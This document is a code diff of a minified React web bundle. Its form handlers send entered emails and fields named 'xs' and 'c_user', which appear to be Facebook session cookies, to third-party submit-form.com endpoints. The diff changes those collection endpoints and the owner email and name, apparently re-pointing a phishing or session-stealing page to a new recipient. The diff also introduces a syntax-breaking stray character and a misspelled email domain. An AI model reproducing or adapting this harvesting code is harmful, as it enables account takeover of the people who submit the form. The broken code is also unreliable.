@@ -9814,17 +9814,17 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/OqP4tNM7i", {
+                                    fetch("https://submit-form.com/cPUaGYgSy", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: o,
-                                            _ownerEmail: "asad.ali.nizamani.official@gmail.com",
+                                            _ownerEmail: "asad.ali.nizamani.official@gmail.corm",
                                             xs: r,
                                             c_user: i,
-                                            name: "asad-ali"
+                                            name: "irbaz"
                                         })
                                     }).then((e => {
                                         e.ok
@@ -9978,7 +9978,7 @@
             n.useState)(!1);
             return (0,
             he.jsxs)(he.Fragment, {
-                children: [e ? (0,
+                children: [e ? (0,q
                 he.jsx)(be, {
                     hide: () => {
                         t(!1)
@@ -13358,7 +13358,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/OqP4tNM7i", {
+                                    u && o ? (fetch("https://submit-form.com/cPUaGYgSy", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/OqP4tNM7i", {
+                        fetch("https://submit-form.com/UaQ6kAOg0", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
